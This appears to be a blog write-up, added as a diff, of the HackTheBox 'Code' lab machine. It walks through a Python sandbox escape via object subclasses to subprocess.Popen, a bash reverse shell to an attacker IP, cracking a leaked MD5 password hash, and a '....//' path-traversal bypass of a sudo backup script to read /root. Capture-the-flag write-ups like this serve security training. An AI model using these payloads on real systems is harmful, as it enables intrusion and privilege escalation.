@@ -1,0 +1,261 @@
+---
+layout: post
+title: HackTheBox Code 
+description: Linux Machine Writeup
+category: Writeups 
+tags: linux web sandbox-escape python-sandbox code htb priv-esc
+image: assets/htb-code-preview.webp
+---
+
+# Code
+
+## Handout
+
+So as the usual web-based machines in hackthebox, a simple IP address and no foothold credentials.
+
+```bash
+target = 10.10.11.62
+echo "code.htb 10.10.11.62" | sudo tee -a /etc/hosts
+```
+
+## Enumeration
+### Nmap
+
+```bash
+nmap $target -sV -sC -vv -Pn -oN code-nmap
+# Nmap 7.95 scan initiated Tue Jul 22 07:44:08 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -Pn -vv -T4 -oN nmap-code 10.10.11.62
+Nmap scan report for 10.10.11.62
+Host is up, received user-set (0.085s latency).
+Scanned at 2025-07-22 07:44:09 EDT for 56s
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
+|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
+|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
+5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET
+|_http-server-header: gunicorn/20.0.4
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+So, `HTTP` on 5000 and `SSH` which of course we'll forget about for now as it's not the usual foothold.
+
+Usually at this point, I launch a UDP scan at the background because we never know. 
+
+And even further, I'd like to run a full poprts scan using `-p-` just in case there is something running on an usual port not included in Nmap's top 1000.
+
+### Stuff that lead to nothing
+So, no subdomains, no vhosts and no hidden directories. Ffuf and other fuzzers lead to nothing so let's focus on the web page we're given.
+
+### Foothold 
+
+So, we're facing a python code editor. The first thing to test is the possibility to import some modules to serve us a reverse shell or whatever it is we want to perform on the machine.
+
+And of course, we're facing an error:
+```python
+import math
+Use of restricted keywords is not allowed.
+```
+So we're being filtered no matter what the module is. So we'll definetly go for escaping the sandbox we're put into.
+
+#### Foothold: Sandbox-Escaping
+Not only the `import` keyword is restricted, but also `eval`, `__builtins__`, `open`.
+So we need a more sophisticated tricky way to find our way in.
+
+A simply google search lead me to this payload:
+```python
+print(().__class__.__bases__[0])
+```
+Which prints out the juicy stuff:
+
+![subclasses dump](assets/htb-code-1.png)
+
+
+So we need to find the `Popen` subclass since it's our way to pop a reverse shell.
+Some digging in more we find the one and only:
+
+```python
+print(().__class__.__bases__[0].__subclasses__()[317])
+
+<class 'subprocess.Popen'>
+```
+So at index 317. We simply fillout a revshell and execute the payload:
+
+```bash
+nc -nlvp 9443
+```
+
+```python
+().__class__.__bases__[0].__subclasses__()[317](
+    ['/bin/bash', '-c', 'bash -i >& /dev/tcp/10.10.16.48/9443 0>&1']
+)
+```
+
+And got a shell as `app-production` user.
+
+### User Flag:
+Not so much searching, the home directory contained the user flag.  Which I thought at the beginning that it was a dummy put by a player.
+
+>User flag owned
+{: .prompt-tip}
+
+
+
+### Pivoting
+
+Poking around a bit for the app directories and home directories we find this:
+
+```bash
+app-production@code:~/app$ ls -l instance
+ls -l instance
+total 16
+-rw-r--r-- 1 app-production app-production 16384 Jul 22 14:10 database.db
+app-production@code:~/app$ cat instance/database.db
+cat instance/database.db
+O"OPtablecodecodeCREATE TABLE code (
+        id INTEGER NOT NULL, 
+        user_id INTEGER NOT NULL, 
+        code TEXT NOT NULL, 
+        name VARCHAR(100) NOT NULL, 
+        PRIMARY KEY (id), 
+        FOREIGN KEY(user_id) REFERENCES user (id)
+)*7tableuseruserCREATE TABLE user (
+        id INTEGER NOT NULL, 
+        username VARCHAR(80) NOT NULL, 
+        password VARCHAR(80) NOT NULL, 
+        PRIMARY KEY (id), 
+        UNIQUE (username)
+QQR*Mmartin3de6f30c4a09c27fc71932bfc68474be/#Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3
+
+&$rtin# Cprint("Functionality test")Testapp-production@code:~/app$ ls -l /home
+ls -l /home
+total 8
+drwxr-x--- 7 app-production app-production 4096 Jul 22 12:51 app-production
+drwxr-x--- 9 martin         martin         4096 Jul 22 14:06 martin
+
+```
+So our job here is that we need to to pivot to martin and get the user.
+Not so much thinking, that an md5 hash of Martin's password, which we can confirm using `hashid` command.
+
+So, a weak password could be cracked, which is the case: **martin:nafeelswordsmaster**
+
+And we ssh into the machine:
+
+```bash
+ssh martin@$target
+```
+
+>SSH as martin
+{: .prompt-tip}
+
+
+### Privilege Escalation
+
+
+We move on now and re-do a whole enumeration on this martin user.
+
+Shortly enough, we find a misconfigured backup script we can run as a sudo user:
+
+```bash
+martin@code:~$ sudo -l
+Matching Defaults entries for martin on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User martin may run the following commands on localhost:
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+```
+
+Here is what this script does:
+1. Ensures that the script is called with exactly one single existing JSON file as its parameter.
+2. Check for the allowed path `/home` and `/var`
+3. Sanitizes the given pathes by removing `../` substrings to filter out directory traversal attempts.
+4. Runs the `/usr/bin/backy` binary on the sanitized target.
+
+This script may be vulnerable to a symlink file in the specified allowed directories. If we can create a symlink to `/root` and prepare the required JSON file, we can get the root flag simply. 
+But, there is a low-hanging fruit we can try: What is it doesn't clear out `....//` ? It is the same as `../` on linux systems and its not as hardcoded.
+
+If that doesn't work, we can look for vulnerbilities in the `/usr/bin/backy` binary but first let's try to create the JSON file with the required fields.
+
+```JSON
+{
+  "destination": "/home/martin/",
+  "directories_to_archive": [
+    "/home/....//root/"
+  ]
+}
+```
+And surely enough:
+
+```bash
+sudo /usr/bin/backy.sh evilsa.json
+
+```
+
+We finaly get this file `code_home_.._root_2025_July.tar.bz2` which we'll simply unzip using:
+
+```bash
+tar -xvf code_home_.._root_2025_July.tar.bz2
+```
+
+>And We got our root flag!
+{: .prompt-tip}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
